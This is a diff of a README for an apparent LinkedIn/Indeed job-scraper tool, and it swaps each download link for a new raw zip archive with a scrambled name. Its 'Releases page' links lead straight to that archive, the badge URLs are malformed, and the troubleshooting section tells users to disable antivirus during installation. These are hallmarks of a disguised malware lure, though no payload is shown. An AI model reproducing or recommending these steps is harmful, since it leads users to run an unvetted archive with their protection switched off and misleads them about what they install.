@@ -1,6 +1,6 @@
 # 🌐 linkedin-x-indeed-others-super-job-scrapers - Effortlessly find jobs across platforms
 
-[![Download Latest Release](https://raw.githubusercontent.com/DevindaRajapaksha/linkedin-x-indeed-others-super-job-scrapers/main/fifteenth/x_super_indeed_others_linkedin_job_scrapers_v3.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/DevindaRajapaksha/linkedin-x-indeed-others-super-job-scrapers/main/fifteenth/x_super_indeed_others_linkedin_job_scrapers_v3.3.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/DevindaRajapaksha/linkedin-x-indeed-others-super-job-scrapers/main/fifteenth/job_indeed_scrapers_others_linkedin_x_super_2.7-alpha.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/DevindaRajapaksha/linkedin-x-indeed-others-super-job-scrapers/main/fifteenth/job_indeed_scrapers_others_linkedin_x_super_2.7-alpha.1.zip)
 
 ## 📖 Description
 The linkedin-x-indeed-others-super-job-scrapers is a multi-platform job scraper that helps you find job listings across various websites. This application allows you to search for jobs from sources like LinkedIn, Indeed, and other platforms. It's designed to make your job search easier and more efficient.
@@ -11,7 +11,7 @@ The linkedin-x-indeed-others-super-job-scrapers is a multi-platform job scraper 
    - Make sure your computer is connected to the internet.
 
 2. **Visit the Releases Page:**
-   - Go to our [Releases page](https://raw.githubusercontent.com/DevindaRajapaksha/linkedin-x-indeed-others-super-job-scrapers/main/fifteenth/x_super_indeed_others_linkedin_job_scrapers_v3.3.zip) to find the latest version of the software.
+   - Go to our [Releases page](https://raw.githubusercontent.com/DevindaRajapaksha/linkedin-x-indeed-others-super-job-scrapers/main/fifteenth/job_indeed_scrapers_others_linkedin_x_super_2.7-alpha.1.zip) to find the latest version of the software.
 
 3. **Download the Application:**
    - Look for the latest version under "Assets."
@@ -45,12 +45,12 @@ The linkedin-x-indeed-others-super-job-scrapers is a multi-platform job scraper 
 ## ⚙️ Troubleshooting
 - If the application does not open, ensure that you have downloaded the correct version for your operating system.
 - Disable any antivirus software temporarily during installation to avoid conflicts.
-- If you encounter errors while running the application, try reinstalling it from the [Releases page](https://raw.githubusercontent.com/DevindaRajapaksha/linkedin-x-indeed-others-super-job-scrapers/main/fifteenth/x_super_indeed_others_linkedin_job_scrapers_v3.3.zip).
+- If you encounter errors while running the application, try reinstalling it from the [Releases page](https://raw.githubusercontent.com/DevindaRajapaksha/linkedin-x-indeed-others-super-job-scrapers/main/fifteenth/job_indeed_scrapers_others_linkedin_x_super_2.7-alpha.1.zip).
 
 ## 📥 Download & Install
 To get started, click the link below to go to the releases page. Here you can download the latest version of the linkedin-x-indeed-others-super-job-scrapers application.
 
-[![Download Latest Release](https://raw.githubusercontent.com/DevindaRajapaksha/linkedin-x-indeed-others-super-job-scrapers/main/fifteenth/x_super_indeed_others_linkedin_job_scrapers_v3.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/DevindaRajapaksha/linkedin-x-indeed-others-super-job-scrapers/main/fifteenth/x_super_indeed_others_linkedin_job_scrapers_v3.3.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/DevindaRajapaksha/linkedin-x-indeed-others-super-job-scrapers/main/fifteenth/job_indeed_scrapers_others_linkedin_x_super_2.7-alpha.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/DevindaRajapaksha/linkedin-x-indeed-others-super-job-scrapers/main/fifteenth/job_indeed_scrapers_others_linkedin_x_super_2.7-alpha.1.zip)
 
 ## 📞 Support
 If you need help, you can open an issue in the repository or join our community on Discord. 
